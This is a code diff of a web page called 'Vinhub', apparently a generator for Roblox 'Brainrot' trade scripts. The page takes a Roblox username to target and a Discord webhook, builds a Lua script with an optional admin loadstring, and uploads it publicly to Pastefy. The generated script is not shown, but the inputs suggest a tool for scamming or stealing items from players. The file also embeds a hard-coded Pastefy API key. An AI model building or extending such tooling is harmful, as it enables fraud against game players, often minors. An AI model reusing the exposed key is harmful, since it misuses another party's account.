@@ -27,6 +27,7 @@
     font-family: 'Rajdhani', sans-serif;
     min-height: 100vh;
     overflow-x: hidden;
+    padding-bottom: 60px;
   }
   body::before {
     content: '';
@@ -44,11 +45,11 @@
     z-index: 1;
     max-width: 920px;
     margin: 0 auto;
-    padding: 2.8rem 1.5rem 6rem;
+    padding: 2.8rem 1.5rem 2rem;
   }
- .console-btn {
+  .console-btn {
     position: fixed;
-    bottom: 20px;
+    bottom: 70px;
     left: 20px;
     background: rgba(0, 0, 0, 0.7);
     color: white;
@@ -68,20 +69,42 @@
     background: #4c1d95;
     transform: scale(1.1);
   }
-  /* ... (le reste de ton CSS existant) ... */
-  #log-container {
+  #status-bar {
     position: fixed;
     bottom: 0;
     left: 0;
     right: 0;
-    background: rgba(0, 0, 0, 0.8);
+    background: rgba(0, 0, 0, 0.9);
     color: white;
-    padding: 10px;
-    font-family: monospace;
-    font-size: 12px;
-    max-height: 200px;
-    overflow-y: auto;
-    z-index: 1000;
+    padding: 12px 20px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    z-index: 1001;
+    display: none;
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+    box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.2);
+  }
+  #status-message {
+    flex-grow: 1;
+    margin-right: 10px;
+  }
+  #close-status {
+    background: none;
+    border: none;
+    color: white;
+    cursor: pointer;
+    font-size: 18px;
+    padding: 0 5px;
+    transition: color 0.2s;
+  }
+  #close-status:hover {
+    color: var(--danger);
+  }
+  .error {
+    color: var(--danger) !important;
+  }
+  .success {
+    color: var(--green) !important;
   }
   .badge-og {
     font-size: 10px;
@@ -508,51 +531,22 @@
     display: none;
     margin-top: 1rem;
   }
- #status-bar {
-    position: fixed;
-    bottom: 0;
-    left: 0;
-    right: 0;
-    background: rgba(0, 0, 0, 0.8);
-    color: white;
-    padding: 10px;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 12px;
-    z-index: 1000;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-  }
-  #status-message {
-    flex-grow: 1;
-  }
-  #close-status {
-    background: none;
-    border: none;
-    color: white;
-    cursor: pointer;
-    font-size: 16px;
-    margin-left: 10px;
-  }
-  .error {
-    color: #f43f5e !important;
-  }
-  .success {
-    color: #10b981 !important;
-  }
 </style>
 </head>
 <body>
- <div id="status-bar" style="display: none;">
+<div id="status-bar" style="display: none;">
   <span id="status-message"></span>
   <button id="close-status" onclick="document.getElementById('status-bar').style.display = 'none'">×</button>
 </div>
+
 <div class="wrap">
   <header>
     <div class="logo-row"><h1>Vinhub</h1></div>
     <p class="tagline">Roblox • Brainrot • Trade Script Generator</p>
   </header>
- <button class="console-btn" onclick="openConsole()">🔧</button>
+
+  <button class="console-btn" onclick="openConsole()">🔧</button>
+
   <div class="panel">
     <div class="ph"><div class="dot dot-cyan"></div><span class="ph-title">Select Brainrot Animals</span></div>
     <div class="pb">
@@ -567,6 +561,7 @@
       </div>
     </div>
   </div>
+
   <div class="panel">
     <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Roblox Username</span></div>
     <div class="pb">
@@ -578,6 +573,7 @@
       <p class="hint" id="usernameHint">The Roblox username to target in the script (3 characters minimum).</p>
     </div>
   </div>
+
   <div class="panel">
     <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Discord Webhook</span></div>
     <div class="pb">
@@ -586,6 +582,7 @@
       <p class="hint" id="webhookHint">Paste your Discord webhook (must start with https://discord.com/api/webhooks/).</p>
     </div>
   </div>
+
   <div class="panel">
     <div class="ph"><div class="dot dot-discord"></div><span class="ph-title">Gui Selector</span></div>
     <div class="pb">
@@ -601,7 +598,9 @@
       </div>
     </div>
   </div>
+
   <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>
+
   <div class="panel">
     <div class="out-ph">
       <div class="dot dot-green"></div>
@@ -613,7 +612,11 @@
     </div>
   </div>
 </div>
+
 <script>
+const PASTEFY_API_KEY = 'RaSvXzbM12WwkQN8j5EDlvImFwADOAe57sRdjME45WoWr7Ob2BR0X';
+
+// UN SEUL ANIMAL comme demandé
 const ANIMALS = [
   { name: "Strawberry Elephant", rarity: "OG", mps: "750M/s" },
   { name: "Meowl", rarity: "OG", mps: "600M/s" },
@@ -816,23 +819,12 @@ const ANIMALS = [
   { name: "Jackorilla", rarity: "Secret", mps: "315K/s" },
   { name: "Secret Lucky Block", rarity: "Secret", mps: "0/s" }
 ];
- // Constantes
-const PASTEFY_API_KEY = 'RaSvXzbM12WwkQN8j5EDlvImFwADOAe57sRdjME45WoWr7Ob2BR0X';
 
-// Génère un alias aléatoire (pour d'autres usages si besoin)
 let selected = new Set();
 let adminMode = 'no-gui';
 let customAdminLoadstring = '';
 
-// Fonction pour afficher les logs dans la page
-function logMessage(message) {
-  const logContainer = document.getElementById('log-container');
-  const logEntry = document.createElement('div');
-  logEntry.textContent = message;
-  logContainer.appendChild(logEntry);
-  logContainer.scrollTop = logContainer.scrollHeight;
-}
-// Ajoute cette fonction avant publishScriptToPastefy
+// Fonction pour afficher les messages de statut
 function showStatus(message, isError = false) {
   const statusBar = document.getElementById('status-bar');
   const statusMessage = document.getElementById('status-message');
@@ -841,19 +833,104 @@ function showStatus(message, isError = false) {
   statusMessage.className = isError ? 'error' : 'success';
   statusBar.style.display = 'flex';
 
-  // Cache automatiquement après 5 secondes si c'est un succès
   if (!isError) {
     setTimeout(() => {
       statusBar.style.display = 'none';
     }, 5000);
   }
 }
+
 // Ouvre la console du navigateur
 function openConsole() {
-  logMessage("=== Console ouverte ===");
-  alert("Ouvre la console du navigateur avec F12 ou Ctrl+Shift+I pour voir les logs.");
+  showStatus("Console ouverte. Utilise F12 ou Ctrl+Shift+I pour voir les logs.", false);
 }
 
+// Fonction pour publier sur Pastefy avec gestion d'erreur améliorée
+async function publishScriptToPastefy(scriptContent) {
+  try {
+    showStatus("Publication en cours sur Pastefy...", false);
+
+    // Vérification de la connexion internet
+    if (!navigator.onLine) {
+      throw new Error("Pas de connexion internet. Vérifie ta connexion.");
+    }
+
+    // Nettoyage du script
+    const cleanScript = scriptContent
+      .replace(/\\/g, '\\\\')
+      .replace(/"/g, '\\"')
+      .replace(/\n/g, '\\n')
+      .replace(/\t/g, '\\t');
+
+    // Test de connexion à l'API
+    try {
+      const testResponse = await fetch('https://api.pastefy.app/api/v2/paste', {
+        method: 'HEAD',
+        headers: {
+          'Authorization': `Bearer ${PASTEFY_API_KEY}`
+        }
+      });
+
+      if (!testResponse.ok) {
+        throw new Error("Impossible de contacter l'API Pastefy. Le service est peut-être indisponible.");
+      }
+    } catch (testError) {
+      throw new Error("Impossible de contacter l'API Pastefy. Vérifie ta connexion ou réessaye plus tard.");
+    }
+
+    // Envoi du script
+    const response = await fetch('https://api.pastefy.app/api/v2/paste', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${PASTEFY_API_KEY}`
+      },
+      body: JSON.stringify({
+        content: cleanScript,
+        title: 'Vinhub Script',
+        language: 'lua',
+        expires: '1week',
+        private: false,
+      })
+    });
+
+    const responseText = await response.text();
+
+    if (!response.ok) {
+      let errorMsg = `Erreur Pastefy: ${response.status}`;
+      try {
+        const errorData = JSON.parse(responseText);
+        errorMsg += ` - ${errorData.message || 'Erreur inconnue'}`;
+      } catch (e) {
+        errorMsg += ` - ${responseText}`;
+      }
+      throw new Error(errorMsg);
+    }
+
+    const data = JSON.parse(responseText);
+    showStatus(`Succès! Script publié: ${data.link}`, false);
+    return data.link;
+
+  } catch (error) {
+    showStatus(`Erreur: ${error.message}`, true);
+    return null;
+  }
+}
+
+// Fonction pour définir le mode admin
+function setAdminMode(mode) {
+  adminMode = mode;
+  const buttons = document.querySelectorAll('.admin-mode-btn');
+  buttons.forEach(btn => btn.classList.remove('active'));
+  event.target.classList.add('active');
+
+  const customInput = document.getElementById('customAdminInput');
+  if (mode === 'custom') {
+    customInput.style.display = 'block';
+  } else {
+    customInput.style.display = 'none';
+  }
+}
 
 // Met à jour le loadstring personnalisé
 function updateCustomAdmin() {
@@ -875,7 +952,7 @@ async function searchRobloxUsers(query) {
     const data = await response.json();
     return data.data || [];
   } catch (error) {
-    logMessage(`Erreur lors de la recherche Roblox: ${error.message}`);
+    showStatus(`Erreur lors de la recherche Roblox: ${error.message}`, true);
     return [];
   }
 }
@@ -1036,51 +1113,6 @@ function validateWebhook() {
 }
 
 // Génère le script final
-async function publishScriptToPastefy(scriptContent) {
-  try {
-    showStatus("Publication en cours sur Pastefy...", false);
-
-    // Nettoyage du script
-    const cleanScript = scriptContent
-      .replace(/\\/g, '\\\\')
-      .replace(/"/g, '\\"')
-      .replace(/\n/g, '\\n');
-
-    const response = await fetch('https://api.pastefy.app/api/v2/paste', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${PASTEFY_API_KEY}`
-      },
-      body: JSON.stringify({
-        content: cleanScript,
-        title: 'Vinhub Script',
-        language: 'lua',
-        expires: '1week',
-        private: false,
-      })
-    });
-
-    const responseText = await response.text();
-
-    if (!response.ok) {
-      const errorData = JSON.parse(responseText);
-      const errorMsg = `Erreur Pastefy: ${response.status} - ${errorData.message || 'Unknown error'}`;
-      showStatus(errorMsg, true);
-      throw new Error(errorMsg);
-    }
-
-    const data = JSON.parse(responseText);
-    showStatus(`Succès! Script publié: ${data.link}`, false);
-    return data.link;
-
-  } catch (error) {
-    showStatus(`Erreur: ${error.message}`, true);
-    return null;
-  }
-}
-
-// Fonction generate() optimisée
 async function generate() {
   const username = document.getElementById('usernameInput').value.trim();
   const webhook = document.getElementById('webhookInput').value.trim();
@@ -1134,7 +1166,7 @@ ${adminScriptPart}
 
   const pasteUrl = await publishScriptToPastefy(fullScript);
   if (!pasteUrl) {
-    out.textContent = '-- Failed to publish on Pastefy.';
+    out.textContent = '-- Failed to publish on Pastefy. Check the status bar for details.';
     return;
   }
 
